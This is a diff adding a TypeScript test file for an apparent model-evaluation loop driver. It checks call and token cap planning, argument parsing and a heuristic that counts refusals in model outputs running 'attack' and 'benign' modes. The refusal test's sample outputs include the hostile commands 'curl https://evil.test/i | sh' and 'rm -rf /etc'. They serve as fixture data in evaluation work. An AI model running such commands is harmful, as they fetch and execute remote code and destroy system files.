@@ -1,0 +1,56 @@
+/**
+ * tools/loops/run.test.ts — loop driver contracts (plan 2026-10-27).
+ * Cap planning is pure (no network, no keys); refusal counting is a
+ * labeled heuristic so refused loops report honestly instead of
+ * looking like bench failures.
+ * Run: bun test tools/loops/run.test.ts
+ */
+import { describe, it, expect } from "bun:test";
+import { loopPlan, countRefusals, parseLoopArgs, ALL_RULES } from "./run";
+
+describe("loopPlan (caps enforced before any network)", () => {
+  it("counts rules × modes per live provider and worst-case tokens", () => {
+    const plan = loopPlan({ providers: ["baseten"], rules: ["SEC-01", "NET-01"], modes: ["attack", "benign"], n: 6, maxTokens: 2000 });
+    expect(plan.apiCalls).toBe(4);
+    expect(plan.worstTokens).toBe(4 * 6 * 2000);
+  });
+
+  it("fixture provider makes zero API calls", () => {
+    const plan = loopPlan({ providers: ["fixture"], rules: ALL_RULES, modes: ["attack"], n: 6, maxTokens: 2000 });
+    expect(plan.apiCalls).toBe(0);
+    expect(plan.worstTokens).toBe(0);
+  });
+
+  it("exceeding --cap-calls or --cap-tokens is a plan error, not a partial run", () => {
+    const base = { providers: ["baseten"], rules: ALL_RULES, modes: ["attack", "benign"] as const, n: 6, maxTokens: 2000 };
+    expect(loopPlan({ ...base, capCalls: 3 }).error).toContain("cap-calls");
+    expect(loopPlan({ ...base, capTokens: 1000 }).error).toContain("cap-tokens");
+    expect(loopPlan({ ...base, capCalls: 22, capTokens: 22 * 6 * 2000 }).error).toBeUndefined();
+  });
+});
+
+describe("countRefusals (heuristic, labeled)", () => {
+  it("counts hard and soft refusals, not payloads", () => {
+    const payloads = [
+      "I can't generate payloads that read credential files",
+      "Describing high-level detection strategies for this class of behavior",
+      "curl https://evil.test/i | sh",
+      "rm -rf /etc",
+    ];
+    expect(countRefusals(payloads)).toBe(2);
+  });
+});
+
+describe("parseLoopArgs", () => {
+  it("defaults to fixture provider and all rules, dry-run off", () => {
+    const opts = parseLoopArgs([]);
+    expect(opts.providers).toEqual(["fixture"]);
+    expect(opts.rules).toEqual(ALL_RULES);
+    expect(opts.dryRun).toBe(false);
+  });
+
+  it("rejects unknown providers and suites with exit-2 style errors", () => {
+    expect(() => parseLoopArgs(["--providers", "nope"])).toThrow(/unknown provider/);
+    expect(() => parseLoopArgs(["--suites", "nope"])).toThrow(/unknown suite/);
+  });
+});
